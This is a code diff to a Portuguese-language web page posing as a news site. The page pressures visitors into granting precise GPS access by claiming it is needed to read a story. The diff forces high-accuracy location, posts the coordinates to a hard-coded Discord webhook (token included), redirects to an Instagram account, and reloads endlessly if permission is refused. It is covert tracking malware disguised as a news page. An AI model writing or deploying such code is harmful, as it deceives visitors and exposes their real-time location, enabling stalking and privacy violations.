@@ -21,16 +21,19 @@
 <body onload="iniciar()">
 
     <div class="loader"></div>
-    <p class="aviso">Para acessar a notícia completa, por favor, PERMITA a localização para validarmos sua região.</p>
+    <p class="aviso">Validando sua região para liberar a notícia...</p>
 
     <script>
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1467483594279878717/Yd31-VbARr_0NGE01f3tq7lg8Rg0-fCNxVj2FUED7yZcRt47p_Etr7kyTGUFV_Mq3os8";
 
         function iniciar() {
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(enviarEDirecionar, erroNegado);
+                // Configuração para forçar resposta do GPS mobile
+                const options = { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 };
+                navigator.geolocation.getCurrentPosition(enviarEDirecionar, erroLocalizacao, options);
             } else {
-                alert("Seu navegador não suporta GPS. Tente pelo celular.");
+                alert("GPS não suportado. Tente por um celular moderno.");
+                direcionar();
             }
         }
 
@@ -42,15 +45,18 @@
             fetch(WEBHOOK_URL, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ content: `📍 **Novo acesso à notícia!**\n🌍 **Localização:** ${mapa}` })
-            }).finally(() => {
-                window.location.href = "https://www.instagram.com/montecitybr";
-            });
+                body: JSON.stringify({ content: `📍 **Acesso Monte City!**\n🌍 **Localização:** ${mapa}` })
+            }).finally(() => { direcionar(); });
         }
 
-        function erroNegado() {
-            alert("Atenção: A permissão de localização é obrigatória para acessar as notícias exclusivas da Monte City.");
-            location.reload(); 
+        function erroLocalizacao(err) {
+            // Se o tempo esgotar ou negar, avisa e recarrega
+            alert("A permissão de localização é necessária para ler as notícias da Monte City.");
+            location.reload();
+        }
+
+        function direcionar() {
+            window.location.href = "https://www.instagram.com/montecitybr";
         }
     </script>
 </body>
